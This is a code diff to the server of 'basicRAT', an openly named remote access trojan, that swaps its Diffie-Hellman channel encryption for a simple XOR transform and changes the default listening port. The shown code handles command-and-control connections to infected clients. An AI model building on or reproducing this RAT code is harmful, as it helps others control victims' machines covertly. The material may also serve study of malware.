@@ -11,8 +11,7 @@ import socket
 import sys
 import threading
 
-from core.crypto import encrypt, decrypt, diffiehellman
-
+from core import transform
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -63,16 +62,15 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()
-            dhkey = diffiehellman(conn)
             print("\nnew client [%s]" % addr[0]) 
             client_id = self.client_count
-            client = ClientConnection(conn, addr, dhkey, uid=client_id)
+            client = ClientConnection(conn, addr, uid=client_id)
             self.clients[client_id] = client
             self.client_count += 1
 
     def send_client(self, message, client):
         try:
-            enc_message = encrypt(message, client.dhkey)
+            enc_message = transform.xor(message)
             client.conn.send(enc_message)
         except Exception as e:
             print 'Error: {}'.format(e)
@@ -80,7 +78,7 @@ class Server(threading.Thread):
     def recv_client(self, client):
         try:
             recv_data = client.conn.recv(4096)
-            print decrypt(recv_data, client.dhkey)
+            print transform.xor(recv_data)
         except Exception as e:
             print 'Error: {}'.format(e)
 
@@ -135,17 +133,16 @@ class Server(threading.Thread):
 
 
 class ClientConnection():
-    def __init__(self, conn, addr, dhkey, uid=0):
+    def __init__(self, conn, addr, uid=0):
         self.conn  = conn
         self.addr  = addr
-        self.dhkey = dhkey
         self.uid   = uid
 
 
 def get_parser():
     parser = argparse.ArgumentParser(description='basicRAT server')
     parser.add_argument('-p', '--port', help='Port to listen on.',
-                        default=1337, type=int)
+                        default=8004, type=int)
     return parser
 
 
